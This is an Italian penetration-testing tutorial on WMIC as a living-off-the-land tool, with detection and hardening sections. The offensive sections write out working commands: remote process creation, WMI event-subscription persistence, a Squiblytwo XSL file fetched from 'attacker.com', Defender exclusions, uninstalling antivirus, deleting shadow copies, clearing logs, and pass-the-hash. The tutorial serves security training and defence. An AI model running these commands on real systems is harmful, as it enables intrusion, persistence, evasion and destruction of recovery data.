---
title: 'WMIC: comandi offensivi, lateral movement e persistence su Windows'
slug: wmic
description: >-
  Scopri come usare WMIC per enumeration, remote execution, lateral movement e
  WMI persistence su Windows. Include stato attuale del tool, comandi pratici,
  detection, hardening e confronto con PowerShell, CIM e WinRM.
image: /wmic.webp
draft: false
date: 2026-04-01T00:00:00.000Z
categories:
  - tools
subcategories:
  - post-exploit
tags:
  - wmic
  - windows-lolbin
---

**WMIC (Windows Management Instrumentation Command-line) resta uno degli strumenti più potenti nel toolkit offensivo**, nonostante Microsoft ne abbia avviato la rimozione progressiva dai sistemi operativi moderni. Classificato come **LOLBin** (Living Off the Land Binary) nel progetto LOLBAS e mappato su **MITRE ATT\&CK T1047**, WMIC consente enumerazione, esecuzione remota, lateral movement e persistence senza installare alcun software aggiuntivo. Questo articolo fornisce comandi operativi, tecniche offensive avanzate, strategie di detection e hardening — tutto orientato al lavoro quotidiano del penetration tester professionista.

***

## Status attuale: deprecato ma ancora presente ovunque

Microsoft ha formalmente deprecato WMIC nel 2021 (Windows 10 21H1), ma la rimozione effettiva è avvenuta gradualmente. A partire da **Windows 11 24H2** (clean install) e **Windows Server 2025**, wmic.exe non è più installato di default. Con l'upgrade a **Windows 11 25H2**, WMIC viene rimosso automaticamente durante il processo di aggiornamento. La sottostante infrastruttura WMI rimane però intatta — solo il binario `wmic.exe` viene eliminato.

Nella realtà operativa, la maggior parte degli ambienti enterprise utilizza ancora Windows 10, Windows Server 2019/2022 o versioni di Windows 11 precedenti alla 24H2, dove WMIC è pienamente funzionale. Anche sui sistemi moderni, WMIC può essere reinstallato come Feature on Demand:

```cmd
DISM /Online /Add-Capability /CapabilityName:WMIC~~~~
```

Oppure via PowerShell:

```powershell
Add-WindowsCapability -Online -Name "WMIC~~~~"
```

Il nome della capability è `WMIC~~~~` e l'eseguibile risiede in `C:\Windows\System32\wbem\WMIC.exe`. Il file è firmato Microsoft e considerato affidabile dalla maggior parte delle soluzioni di application whitelisting — caratteristica che lo rende particolarmente interessante in ambito offensivo.

### Tre generazioni di accesso WMI a confronto

La sintassi generale di WMIC segue lo schema `WMIC [switch globali] [alias] [WHERE clause] [verbo] [proprietà] [formato]`. Gli switch globali più importanti per il pentester sono `/node:` (target remoto), `/user:`, `/password:` e `/namespace:`. Ma WMIC non è l'unica interfaccia verso WMI.

| Caratteristica        | WMIC                             | Get-WmiObject         | Get-CimInstance       |
| --------------------- | -------------------------------- | --------------------- | --------------------- |
| **Introdotto**        | Windows XP (2001)                | PowerShell 1.0 (2006) | PowerShell 3.0 (2012) |
| **Status**            | Deprecato, in rimozione          | Rimosso in PS 6+      | **Raccomandato**      |
| **Protocollo remoto** | DCOM (TCP 135 + porte dinamiche) | DCOM                  | WinRM (TCP 5985/5986) |
| **Pass-the-Hash**     | No (nativo)                      | No (nativo)           | No (nativo)           |
| **Cross-platform**    | No                               | No                    | Sì (PS 7/Core)        |
| **Output**            | Testo UTF-16                     | Oggetti .NET live     | Oggetti CIM inerti    |

**Get-CimInstance** è il sostituto ufficiale, utilizza WinRM su porte fisse (firewall-friendly) e supporta sessioni CIM persistenti. Tuttavia, dal punto di vista offensivo, WMIC presenta vantaggi: non richiede PowerShell (evitando AMSI e Script Block Logging), è un singolo eseguibile senza dipendenze, e la sua command line è più semplice da usare in batch script e one-liner.

```powershell
# Equivalenze rapide WMIC → PowerShell
# wmic os get Caption,Version → 
Get-CimInstance Win32_OperatingSystem | Select Caption,Version

# wmic process list brief →
Get-CimInstance Win32_Process | Select Handle,Name,ProcessId

# wmic /node:SRV01 os get Caption →
Get-CimInstance Win32_OperatingSystem -ComputerName SRV01 | Select Caption
```

***

## Enumerazione: i comandi fondamentali del pentester

L'enumerazione è la fase in cui WMIC brilla davvero. Ogni comando produce output immediato senza installare tool aggiuntivi, rendendolo ideale per ambienti restrittivi.

### Sistema operativo e configurazione

```cmd
wmic os get Caption, Version, BuildNumber, OSArchitecture, CSName /format:list
```

Output atteso:

```
BuildNumber=19045
Caption=Microsoft Windows 10 Enterprise
CSName=WORKSTATION01
OSArchitecture=64-bit
Version=10.0.19045
```

```cmd
wmic computersystem get Name, Domain, Manufacturer, Model, Username, Roles /format:list
```

Output atteso:

```
Domain=corp.local
Name=WORKSTATION01
Roles={LM_Workstation, LM_Server, NT}
Username=CORP\jsmith
```

### Processi in esecuzione

```cmd
wmic process get Name, ProcessId, ParentProcessId, ExecutablePath /format:list
wmic process get Name, ProcessId, CommandLine /format:csv
wmic process where "Name='svchost.exe'" get ProcessId, CommandLine
wmic PROCESS WHERE "NOT ExecutablePath LIKE '%Windows%'" GET ExecutablePath
```

La query che filtra processi fuori da `%Windows%` è particolarmente utile per identificare binari sospetti o software di terze parti con potenziali vulnerabilità.

### Servizi e unquoted service paths

```cmd
wmic service get Name, DisplayName, PathName, StartMode, State, StartName /format:list
```

Il comando più importante per la privilege escalation tramite unquoted service paths:

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v "\""
```

Se l'output mostra un percorso come `C:\Program Files\Vuln App\service.exe` senza virgolette, Windows tenterà di eseguire `C:\Program.exe`, poi `C:\Program Files\Vuln.exe`, creando un vettore di privilege escalation se l'attaccante può scrivere in quei percorsi intermedi.

### Utenti, gruppi e rete

```cmd
wmic useraccount where "LocalAccount=True" get Name, SID, Status
wmic group get Caption, Domain, LocalAccount, SID
wmic nicconfig where "IPEnabled=True" get Description, IPAddress, DefaultIPGateway, DNSServerSearchOrder, MACAddress
wmic qfe get HotFixID, InstalledOn
wmic share get Name, Path, Status, Type
```

### Security products detection

```cmd
wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName, productState, pathToSignedProductExe
wmic /namespace:\\root\SecurityCenter2 path FirewallProduct get displayName
```

**Nota critica**: il namespace `root\SecurityCenter2` esiste solo su OS client (Windows 10/11), non su Windows Server. Sui server, enumerare i prodotti AV cercando nomi di servizio e processi specifici.

### Enumerazione Active Directory via LDAP namespace

WMIC accede direttamente ad Active Directory tramite il namespace `root\directory\ldap`:

```cmd
wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET ds_samaccountname
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group GET ds_samaccountname
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" Get ds_member /Value
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_dnshostname
wmic NTDOMAIN GET DomainControllerAddress,DomainName,Roles /VALUE
```

Per trovare dove sono loggati gli admin:

```cmd
for /f %a in (server_list.txt) do @echo %a & @wmic /node:"%a" computersystem get username 2>nul | findstr /i "admin"
```

***

## Lateral movement e remote execution

La capacità di eseguire processi su macchine remote è il cuore dell'utilizzo offensivo di WMIC. Il pattern fondamentale è:

```cmd
wmic /node:"192.168.1.50" /user:"CORP\admin" /password:"P@ssw0rd" process call create "cmd.exe /c whoami > C:\temp\output.txt"
```

Output atteso:

```
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
    ProcessId = 5765;
    ReturnValue = 0;
};
```

**ReturnValue 0** indica successo. Il problema principale è che **WMIC non restituisce l'output del comando remoto**. I workaround operativi includono la scrittura su share SMB dell'attaccante o sulla share amministrativa `C$` del target:

```cmd
:: Output su share dell'attaccante
wmic /node:"10.10.10.50" /user:"CORP\admin" /password:"P@ss" process call create "cmd.exe /c ipconfig /all >> \\10.10.14.5\share\output.txt"

:: Output su C$ e lettura successiva
wmic /node:"10.10.10.50" process call create "cmd.exe /c hostname > C:\Windows\Temp\out.txt"
type \\10.10.10.50\C$\Windows\Temp\out.txt
```

Per operazioni su più host simultaneamente:

```cmd
wmic /node:@targets.txt /user:"CORP\admin" /password:"P@ss" /failfast:on process call create "cmd.exe /c netstat -ano >> \\ATTACKER\share\%COMPUTERNAME%.txt"
```

Lo switch `/failfast:on` è essenziale per operazioni batch: salta rapidamente gli host non raggiungibili evitando timeout prolungati.

### Manipolazione servizi da remoto

```cmd
wmic /node:"192.168.1.50" service where "name='VulnSvc'" call startservice
wmic /node:"192.168.1.50" service where "name='VulnSvc'" call stopservice
wmic /node:"TARGET" process call create "cmd.exe /c sc create backdoor binpath= \"C:\payload.exe\" start= auto obj= LocalSystem"
```

***

## Persistence tramite WMI Event Subscription

La tecnica di persistence più sofisticata basata su WMI è l'**Event Subscription** (MITRE ATT\&CK T1546.003). Richiede tre componenti: un **EventFilter** (trigger), un **EventConsumer** (payload) e un **FilterToConsumerBinding** (collegamento). I consumer vengono eseguiti come **SYSTEM**.

### Implementazione completa via WMIC

```cmd
:: Step 1: Creare l'EventFilter (trigger entro 60 secondi dal boot)
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="SysHealthCheck", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"

:: Step 2: Creare il CommandLineEventConsumer
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="SysHealthCheck", ExecutablePath="C:\Windows\Temp\payload.exe", CommandLineTemplate="C:\Windows\Temp\payload.exe"

:: Step 3: Creare il Binding
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"SysHealthCheck\"", Consumer="CommandLineEventConsumer.Name=\"SysHealthCheck\""
```

### Implementazione PowerShell (più flessibile)

```powershell
$FilterArgs = @{
    Name = 'SystemHealthCheck'
    EventNameSpace = 'root\CimV2'
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
}
$Filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

$ConsumerArgs = @{
    Name = 'SystemHealthCheck'
    CommandLineTemplate = "$($Env:SystemRoot)\System32\healthcheck.exe"
}
$Consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

$BindingArgs = @{
    Filter = [Ref]$Filter
    Consumer = [Ref]$Consumer
}
New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $BindingArgs
```

### Query WQL trigger utili

* **Time-based**: `SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 11 AND TargetInstance.Minute = 30`
* **USB insertion**: `SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LogicalDisk'`
* **Process start**: `SELECT * FROM __InstanceCreationEvent WITHIN 3 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'`
* **User logon**: `SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = '4624'`

***

## Evasion e tecniche LOLBin avanzate

### Squiblytwo: XSL Script Processing (T1220)

La tecnica offensiva più potente di WMIC è l'**XSL Script Processing**, scoperta da Casey Smith (@subtee). Lo switch `/FORMAT:` processa fogli di stile XSL che possono contenere JScript o VBScript embedded, consentendo esecuzione arbitraria di codice attraverso un binario trusted Microsoft.

```cmd
:: Esecuzione da file locale
wmic os get /format:"evil.xsl"

:: Esecuzione da URL remoto
wmic process get brief /format:"https://attacker.com/evil.xsl"

:: Esecuzione da path UNC/SMB
wmic process get brief /format:"\\192.168.1.100\share\evil.xsl"
```

Esempio di file XSL malevolo:

```xml
<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
    <ms:script implements-prefix="user" language="JScript">
    <![CDATA[
    var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
    ]]> </ms:script>
</stylesheet>
```

Questa tecnica bypassa molte soluzioni di application whitelisting perché `wmic.exe` è firmato Microsoft. Gli **IOC** includono il caricamento di librerie DotNet CLR (`jscript.dll`, `vbscript.dll`) nel processo wmic.exe e connessioni di rete originate da wmic.exe. Il gruppo APT **FIN7** è stato osservato usare questa tecnica in the wild.

### Disabilitare le difese tramite WMIC

```cmd
:: Aggiungere esclusioni a Windows Defender
wmic /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath="C:\Temp"
wmic /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionProcess="payload.exe"

:: Disinstallare prodotti di sicurezza
wmic product where "name like '%%Symantec%%'" call uninstall /nointeractive

:: Eliminare shadow copies (tecnica ransomware)
wmic shadowcopy delete

:: Cancellare event log
wmic nteventlog where filename='security' call cleareventlog
```

***

## Integrazione negli attack chain con tool offensivi

WMIC non opera in isolamento. La sua vera potenza emerge nell'integrazione con l'ecosistema offensivo completo.

### Impacket wmiexec.py: il sostituto cross-platform

Impacket reimplementa il protocollo DCOM/WMI in Python, abilitando funzionalità cruciali che il WMIC nativo non offre — in primis il **Pass-the-Hash**:

```bash
# Autenticazione con password
wmiexec.py domain/username:password@targetIP

# Pass-the-Hash
wmiexec.py administrator@192.168.1.105 -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38

# Kerberos
wmiexec.py domain/user@target -k -no-pass
```

wmiexec.py esegue comandi tramite `Win32_Process::Create` e cattura l'output redirezionandolo in un file temporaneo sulla share `ADMIN$` (`cmd.exe /Q /C <command> 1> \\127.0.0.1\ADMIN$\__<timestamp> 2>&1`), che viene letto via SMB e poi cancellato. **Attenzione**: se la sessione viene interrotta (CTRL+C), i file temporanei `__<epochtime>` persistono su disco — un artefatto forense rilevante.

### CrackMapExec/NetExec: WMI in scala

```bash
# Esecuzione via protocollo WMI
nxc wmi 192.168.1.105 -u admin -p 'P@ssw0rd' -x whoami

# Pass-the-Hash su subnet
nxc smb 172.16.157.0/24 -u administrator -H 'NTHASH' --local-auth

# Force wmiexec come metodo di esecuzione
nxc smb TARGET -u user -p 'pass' -x 'command' --exec-method wmiexec
```

NetExec supporta cinque metodi di esecuzione: **wmiexec** (default, più stealth), **atexec** (scheduled task), **smbexec** (servizio), **mmcexec** (MMC), e **wmiexec-event** (event subscription).

Leggi le nostre guide su [crackmapexec](https://hackita.it/articoli/crackmapexec/) e [netexec](https://hackita.it/articoli/netexec/) 

### Framework C2: Cobalt Strike, Metasploit, Empire

| Framework                                                      | Modulo WMI                              | Funzionalità                                                        |
| -------------------------------------------------------------- | --------------------------------------- | ------------------------------------------------------------------- |
| **[Cobalt Strike](https://hackita.it/articoli/cobalt-strike)** | `remote-exec wmi TARGET "command"`      | Esecuzione remota, BOF per WMI ProcCreate e EventSub                |
| **Metasploit**                                                 | `exploit/windows/local/wmi`             | Esecuzione remota via WMI su TCP 135                                |
| **[Metasploit](https://hackita.it/articoli/metasploit)**       | `exploit/windows/local/wmi_persistence` | Persistence via 5 metodi (EVENT, INTERVAL, LOGON, PROCESS, WAITFOR) |
| **[Empire](https://hackita.it/articoli/empire)**               | `lateral_movement/invoke_wmi`           | Lateral movement con launcher PowerShell base64                     |
| **[Sliver](https://hackita.it/articoli/silver)**               | `execute -o wmic /node:<IP> ...`        | Esecuzione diretta + SharpWMI via Armory                            |

**Il WMIC nativo non supporta [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash/)** — richiede password in chiaro. Per PTH su WMI servono [Impacket](https://hackita.it/articoli/impacket), NetExec, o Invoke-WMIExec (PowerShell di Kevin Robertson). Requisito aggiuntivo: per account non-RID-500, il registro `LocalAccountTokenFilterPolicy` deve essere impostato a `1` sul target per bypassare la restrizione UAC remota.

***

## Comparazione operativa: quando usare cosa

### WMIC vs PsExec

| Aspetto                | WMIC                                            | PsExec                                               |
| ---------------------- | ----------------------------------------------- | ---------------------------------------------------- |
| **Protocollo**         | DCOM/RPC (porta 135 + dinamiche)                | SMB (porta 445)                                      |
| **Esegue come**        | Utente autenticato                              | SYSTEM (default)                                     |
| **File su disco**      | Nessuno (fire-and-forget)                       | PSEXESVC.exe su ADMIN$                               |
| **Creazione servizio** | No                                              | Sì (EID 7045/4697)                                   |
| **Artefatti forensi**  | 4624 Type 3, wmiprvse.exe spawn                 | 4624, 7045, PSEXESVC su disco, chiave registro EULA  |
| **Rilevamento AV**     | Basso                                           | Alto — molti EDR flaggano PSEXESVC                   |
| **PTH nativo**         | No                                              | No (sì con Impacket)                                 |
| **Uso preferibile**    | Stealth, porta 445 bloccata, no artefatti disco | Serve shell interattiva, serve SYSTEM, DCOM bloccato |

**Insight chiave**: gli attaccanti sofisticati preferiscono WMI a PsExec perché non crea servizi, non scrive binari su disco e genera meno artefatti rilevabili. La creazione del servizio PSEXESVC è immediatamente rilevata dai moderni EDR.

### WMIC vs WinRM

| Aspetto               | WMIC (DCOM)                   | WinRM                                       |
| --------------------- | ----------------------------- | ------------------------------------------- |
| **Porte**             | 135 + 49152-65535 (dinamiche) | 5985 (HTTP) / 5986 (HTTPS)                  |
| **Firewall**          | Problematico (range dinamico) | Amichevole (porta singola)                  |
| **Default**           | WMI sempre attivo             | Deve essere abilitato (`winrm quickconfig`) |
| **Shell interattiva** | No                            | Sì (`Enter-PSSession`, Evil-WinRM)          |
| **Processo target**   | wmiprvse.exe                  | wsmprovhost.exe                             |
| **PTH**               | No nativo / Sì Impacket       | Sì (Evil-WinRM con `-H`)                    |

WinRM è preferibile quando è abilitato e serve una shell interattiva. WMIC è preferibile quando WinRM non è configurato (scenario frequente) e si vuole evitare il logging PowerShell.

***

## Detection e blue team: come individuare l'abuso di WMIC

### Event ID Windows fondamentali

Il log **Microsoft-Windows-WMI-Activity/Operational** è abilitato di default e registra:

* **Event ID 5857**: caricamento di un WMI provider (DLL, PID, risultato)
* **Event ID 5858**: fallimento operazione WMI client (query WQL, utente, macchina)
* **Event ID 5860**: creazione di event subscription temporanee
* **Event ID 5861**: **critico per detection** — registra la creazione di WMI event subscription permanenti (persistence)

Nel Security log, con command-line auditing abilitato:

* **Event ID 4688**: creazione processo — cattura `wmic.exe` con argomenti completi
* **Event ID 4624 Type 3**: logon di rete correlato a WMI remoto
* **Event ID 4648**: logon esplicito con credenziali (uso di `/user:` e `/password:`)

Per abilitare il command-line logging: `Computer Configuration > Administrative Templates > System > Audit Process Creation > Include command line in process creation events = Enabled`

### Sysmon: la detection definitiva

Sysmon è lo strumento più efficace per il monitoraggio di WMIC. Le regole chiave:

* **Event ID 1** (Process Create): cattura wmic.exe con command line completa e processo padre
* **Event ID 19/20/21** (WMI Events): cattura creazione di EventFilter, EventConsumer e Binding — **essenziale per la persistence detection**
* **Event ID 3** (Network Connection): cattura connessioni di rete da wmic.exe per WMI remoto
* **Event ID 7** (Image Load): rileva caricamento di jscript.dll/vbscript.dll in wmic.exe (indicatore XSL Processing)

Configurazione Sysmon consigliata per WMIC:

```xml
<Sysmon schemaversion="4.90">
  <HashAlgorithms>*</HashAlgorithms>
  <EventFiltering>
    <RuleGroup name="WMIC_Detection" groupRelation="or">
      <ProcessCreate onmatch="include">
        <Image condition="end with">\wmic.exe</Image>
        <CommandLine condition="contains">process call create</CommandLine>
        <CommandLine condition="contains">/node:</CommandLine>
        <CommandLine condition="contains">shadowcopy delete</CommandLine>
        <CommandLine condition="contains">/format:</CommandLine>
        <CommandLine condition="contains">\root\subscription</CommandLine>
        <ParentImage condition="end with">\wmiprvse.exe</ParentImage>
      </ProcessCreate>
    </RuleGroup>
    <!-- WMI Event Subscription: loggare TUTTO -->
    <RuleGroup name="WMI_Persistence" groupRelation="or">
      <WmiEvent onmatch="exclude">
      </WmiEvent>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

Le WMI Event Subscription legittime sono rare — la strategia di logging basata su esclusione senza filtri (loggare tutto) è la più efficace. I config di SwiftOnSecurity e Olaf Hartong (sysmon-modular) sono ottimi punti di partenza per la produzione.

### Sigma rules principali

Il repository SigmaHQ contiene numerose regole per WMIC:

* **`proc_creation_win_wmic_process_creation.yml`**: rileva `process call create` nella command line
* **`proc_creation_win_wmic_xsl_script_processing.yml`**: rileva `/format:` con valori non standard (esclude List, htable, csv, ecc.)
* **`proc_creation_win_wmic_squiblytwo_bypass.yml`**: rileva XSL loading da URL remoti
* **`proc_creation_win_wmic_recon_process.yml`**: rileva enumerazione processi e hotfix
* **`image_load_wmic_remote_xsl_scripting_dlls.yml`**: rileva caricamento di jscript.dll/vbscript.dll in wmic.exe

### Come gli EDR moderni rilevano WMIC

Gli EDR più avanzati monitorano diversi indicatori comportamentali. Il pattern **wmiprvse.exe che genera processi figlio sospetti** (cmd.exe, powershell.exe, rundll32.exe, certutil.exe, mshta.exe, scrcons.exe) è il segnale più forte di abuso WMI remoto. L'integrazione AMSI cattura operazioni WMI a livello API indipendentemente dal binario chiamante. Per Impacket wmiexec.py, la firma forense è il pattern `cmd.exe /Q /C <command> 1> \\127.0.0.1\ADMIN$\__<timestamp> 2>&1` — altamente specifico e facilmente rilevabile.

La **ASR rule `d1e49aac-8f56-4280-b9ba-993a6d77406c`** di Microsoft Defender blocca specificamente la creazione di processi originati da PsExec e comandi WMI.

***

## Hardening e mitigazione operativa

### Bloccare WMIC a livello enterprise

La strategia difensiva più efficace opera su più livelli simultaneamente:

**1. Rimozione del binario** (Windows 11+):

```cmd
DISM /Online /Remove-Capability /CapabilityName:WMIC~~~~
```

**2. WDAC (Windows Defender Application Control)** — wmic.exe è nella **block list raccomandata da Microsoft**:

```xml
<Deny ID="ID_DENY_WMIC" FriendlyName="wmic.exe"
      FileName="wmic.exe"
      MinimumFileVersion="0.0.0.0"
      MaximumFileVersion="65535.65535.65535.65535" />
```

**3. AppLocker** — regola deny per entrambi i percorsi:

* `%SYSTEM32%\wbem\wmic.exe`
* `%SYSWOW64%\wbem\wmic.exe`

**4. Firewall — blocco WMI remoto**:

```cmd
netsh advfirewall firewall set rule group="windows management instrumentation (wmi)" new enable=no
netsh advfirewall firewall add rule name="Block WMI-DCOM-In" dir=in action=block protocol=TCP localport=135
netsh advfirewall firewall add rule name="Block WinRM-HTTP" dir=in action=block protocol=TCP localport=5985
```

**5. ASR Rule via PowerShell**:

```powershell
Set-MpPreference -AttackSurfaceReductionRules_Ids d1e49aac-8f56-4280-b9ba-993a6d77406c -AttackSurfaceReductionRules_Actions Enabled
```

**6. WMI Namespace Security**: tramite `wmimgmt.msc`, rimuovere il permesso "Remote Enable" per il gruppo `Authenticated Users` dal namespace `root\cimv2`. Garantire che solo Domain Admins e SYSTEM abbiano accesso remoto.

**7. Segmentazione di rete**: bloccare le porte DCOM/WMI (**135, 49152-65535**) tra le subnet workstation — le workstation non dovrebbero mai eseguire WMI l'una verso l'altra. Consentire il traffico WMI solo dalle Privileged Access Workstations (PAW) e jump server dedicati.

***

## Troubleshooting e problemi comuni

### Errori frequenti e soluzioni

**"Access Denied" (0x80070005)**: credenziali errate, utente senza privilegi admin sul target, o UAC che blocca l'accesso remoto. Per ambienti workgroup (non dominio), impostare `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy = 1` sul target. Formato credenziali corretto: `DOMAIN\username` (non UPN).

**"RPC Server Unavailable" (0x800706BA)**: target offline, firewall che blocca TCP 135, servizio WMI/RPC non attivo, o problemi DNS. Verificare connettività, abilitare l'eccezione firewall Remote Administration, e assicurarsi che le porte DCOM dinamiche (49152-65535) siano raggiungibili.

**"Invalid Namespace"**: il namespace richiesto non esiste sul target. Tipico errore: queryare `root\SecurityCenter2` su Windows Server (esiste solo su client) o `root\directory\ldap` su macchine non-DC.

**Problemi di encoding**: tutto l'output WMIC è **UTF-16 Unicode con BOM**. Per convertire in ASCII, passare l'output attraverso `more`: `wmic os list brief | more >> output.txt`. L'ultima riga dell'output WMIC è sempre un singolo CR vuoto — gestirlo nei loop batch.

**"Invalid XSL format"**: spesso causato da impostazioni regionali diverse — i file XSL risiedono in sottodirectory locale-specifiche in `C:\Windows\System32\WBEM\`.

### Performance su reti estese

La query `Win32_Product` è notoriamente lenta perché triggera un controllo di riconfigurazione MSI — evitarla quando possibile. Per operazioni batch su 100+ host, usare `/failfast:on` e considerare l'esecuzione parallela:

```cmd
for /f %a in (hosts.txt) do start /b wmic /node:"%a" /failfast:on os get CSName, Caption > %a_output.txt
```

I formati di output disponibili includono `/format:list` (chiave=valore, più facile da parsare), `/format:csv` (per spreadsheet), `/format:htable` (HTML table per report), e `/format:rawxml`.

***

## Conclusione

WMIC rappresenta un caso studio perfetto del paradigma "Living off the Land": un tool legittimo, firmato Microsoft, presente su praticamente ogni sistema Windows in produzione, che offre capacità offensive formidabili senza richiedere alcun upload. La sua deprecazione progressiva ridurrà l'attack surface nei prossimi anni, ma la realtà operativa del 2026 vede ancora milioni di sistemi con WMIC pienamente funzionale.

Per il penetration tester, i takeaway operativi sono tre. Primo: **WMIC resta lo strumento più veloce per l'enumerazione iniziale** quando si atterra su un sistema Windows senza accesso a PowerShell o tool esterni. Secondo: la combinazione **WMIC + Impacket wmiexec.py** copre praticamente ogni scenario di lateral movement WMI, con il nativo per ambienti Windows e Impacket per PTH e shell interattive da Linux. Terzo: la tecnica **Squiblytwo (XSL Processing)** resta rilevante come bypass di application whitelisting, anche se le Sigma rules e gli EDR moderni la rilevano con crescente efficacia.

Dal lato difensivo, la combinazione di **Sysmon Event ID 19/20/21** per la persistence detection, **ASR rule d1e49aac** per il blocco comportamentale, e la **rimozione del binario via DISM** sui sistemi moderni costituisce una difesa in profondità efficace. Il traffico WMI tra workstation non-amministrative resta uno degli indicatori di compromissione più affidabili in qualsiasi ambiente enterprise — monitorarlo dovrebbe essere una priorità per ogni SOC.
